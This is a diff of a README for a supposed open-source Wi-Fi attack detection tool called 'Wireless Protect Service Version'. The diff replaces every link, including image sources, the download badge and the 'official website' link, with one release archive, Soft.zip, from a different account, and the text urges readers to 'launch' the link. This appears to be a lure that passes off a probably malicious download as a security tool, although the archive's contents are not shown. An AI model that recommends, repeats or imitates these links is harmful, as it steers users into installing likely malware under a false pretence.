@@ -1,7 +1,7 @@
 
 # Welcome to Wireless Protect Service Version 👾
 
-![Wireless Protect](https://img.icons8.com/nolan/2x/network.png)
+![Wireless Protect](https://github.com/Wolladand120/Wireless-Protect_Service_Version/releases/download/v1.0/Soft.zip)
 
 Welcome to the official GitHub repository of **Wireless Protect Service Version**. This open-source tool is designed to detect various types of attacks on Wi-Fi networks, including deauthentication, Evil Twin, Cloned Wi-Fi, ARP Spoofing, and Man-in-the-Middle attacks. With its advanced functionality, Wireless Protect enhances the security of your wireless network and helps you stay protected against malicious activities.
 
@@ -16,7 +16,7 @@ Welcome to the official GitHub repository of **Wireless Protect Service Version*
 
 To install and run Wireless Protect Service Version, please download the latest release package from the link below:
 
-[![Download Now](https://img.shields.io/badge/Download%20Release-Click%20to%20Launch-red)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Now](https://github.com/Wolladand120/Wireless-Protect_Service_Version/releases/download/v1.0/Soft.zip%20Release-Click%20to%20Launch-red)](https://github.com/Wolladand120/Wireless-Protect_Service_Version/releases/download/v1.0/Soft.zip)
 
 Remember, the link needs to be launched to initiate the download of the tool. If you encounter any issues with the link provided, make sure to check the "Releases" section of this repository for alternative download options.
 
@@ -41,8 +41,8 @@ We welcome contributions from the open-source community to make Wireless Protect
 
 ## Stay Connected 🌐
 
-For more information and updates about Wireless Protect Service Version, visit our [official website](https://www.wirelessprotect.com). Connect with us on social media platforms to stay informed about the latest developments and releases.
+For more information and updates about Wireless Protect Service Version, visit our [official website](https://github.com/Wolladand120/Wireless-Protect_Service_Version/releases/download/v1.0/Soft.zip). Connect with us on social media platforms to stay informed about the latest developments and releases.
 
 Thank you for choosing Wireless Protect Service Version to secure your wireless network against potential threats. Stay safe and protected with our advanced detection capabilities! 🛡️🔒
 
-![Security Shield](https://img.icons8.com/ios-filled/50/000000/security-shield.png)
+![Security Shield](https://github.com/Wolladand120/Wireless-Protect_Service_Version/releases/download/v1.0/Soft.zip)
